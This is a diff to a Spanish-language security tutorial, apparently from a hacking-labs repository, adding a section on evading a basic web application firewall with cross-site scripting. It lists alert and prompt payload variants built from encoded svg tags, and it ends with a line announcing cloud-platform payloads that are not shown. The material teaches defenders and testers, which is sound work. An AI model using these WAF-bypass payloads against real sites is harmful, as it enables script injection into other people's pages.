@@ -83,6 +83,17 @@ Ejemplo: https://ejemplo.com/?q=<script>alert(1)</script>
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="images/xss2.png">
   <source media="(prefers-color-scheme: light)" srcset="images/xss2.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/xss2.png" width="75%">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/xss2.png" width="100%">
 </picture>
 </p>
+
+### Ejemplificando: totalmente real :bomb:	
+
+> Este es un ejemplo totalmente real de bypass (evasión) de un WAF básico:
+
+| **`<script>alert(1)</script>`** | **Variantes de evasión**                                                                                          |
+|-------------------------------|---------------------------------------------------------------------------------------------------------------------|
+|                               | `&#x3C;svg/onload=prompt(1)&#x3E;`                                                                                  |
+|                               | `<svg><set onbegin=alert(1) attributeName=x></set></svg>`                                                           |
+
+> Obtendríamos el mismo efecto, pero de formas totalmente distintas, es decir, tendríamos un bypass exitoso… Veamos algunos payloads totalmente funcionales para las plataformas más conocidas de la nube:
